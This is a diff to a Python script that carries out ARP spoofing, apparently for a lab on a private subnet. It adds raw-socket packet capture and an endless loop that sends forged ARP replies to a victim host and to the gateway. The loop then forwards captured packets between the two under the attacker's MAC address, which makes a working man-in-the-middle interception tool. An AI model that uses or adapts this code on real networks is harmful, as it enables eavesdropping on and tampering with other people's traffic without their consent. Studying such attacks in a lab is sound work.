@@ -37,11 +37,40 @@ print type(lst_HA[0])
 
 
 
-#get Gateway MAC
+'''
+get Gateway MAC
+
+'''
 
 hwData = check_output("arp -a | awk '$2~/(172.20.10.1)/{print $4;}'", shell = True) 
 # arp -a | awk '$NUM ~EQUAL /PATTERN/ {print $4;}'
 hwAddr= hwData.strip()
+
+
+
+'''
+function 
+example = binascii.hexlify(packet[0][26:30])
+hex2string(example)
+
+17020103
+'''
+
+def hex2string(t):
+	lst = ""
+	for i in range(0, len(t),2):
+		lst += str(int(t[i:i+2],16))
+
+	return lst
+
+'''
+Open Socket
+'''
+
+def openSocket():
+	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) #htons: gets all packets
+	s.bind(("wlp1s0",0))#(device,0)
+	packet = s.recvfrom(2048)
 
 
 
@@ -146,6 +175,12 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 			struct.pack('!6B',*SENDER_HA),
 			struct.pack('!4B',172,20,10,7) ]
 
+		
+
+else:
+	pass
+
+
 '''
 		while(1):
 			s.send(b''.join(ARP2))
@@ -175,10 +210,54 @@ ARP3 =[	struct.pack('!6B',*GATE_HA), #Destination HA
 		struct.pack('!4B',172,20,10,1) ]
 
 #s.send(b''.join(ARP3))
+
+sdIP = "ac140a07"
+gtIP = "ac140a01"
+
+
+
 while(1):
 		s.send(b''.join(ARP2))
 		s.send(b''.join(ARP3))
-		time.sleep(3)
+		#time.sleep(3)
+		
+		
+		s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) #htons: gets all packets
+		s.bind(("wlp1s0",0))#(device,0)
+		packet = s.recvfrom(2048)
+
+
+		srcIP = binascii.hexlify(packet[0][26:30])
+		dstIP = binascii.hexlify(packet[0][30:34])
+
+		PACKET_HEADER1 = [
+		struct.pack('!6B',*GATE_HA), #Destination HA
+		struct.pack('!6B',*lst_HA), #Source HA
+		packet[0][12:]
+		]
+
+		PACKET_HEADER2 = [
+		struct.pack('!6B',*SENDER_HA), #Destination HA
+		struct.pack('!6B',*lst_HA), #Source HA
+		packet[0][12:]
+		]
+
+
+		if (srcIP == sdIP and dstIP == gtIP):
+			s.send(b''.join(PACKET_HEADER1))	
+			print "Packet from sender to gateway"
+		elif (srcIP == gtIP and dstIP == sdIP):
+			s.send(b''.join(PACKET_HEADER2))
+			print "Packet from gateway to sender"
+		else:
+			print srcIP, dstIP
+			print "Could NOT find any matching IP"	
+
+
+#		t = packet[0][27:31]
+
+#		print int(binascii.hexlify(t),16)
 
 s.close()
 
+#Destination: f2:c5:f3:e3:be:64 (f2:c5:f3:e3:be:64)
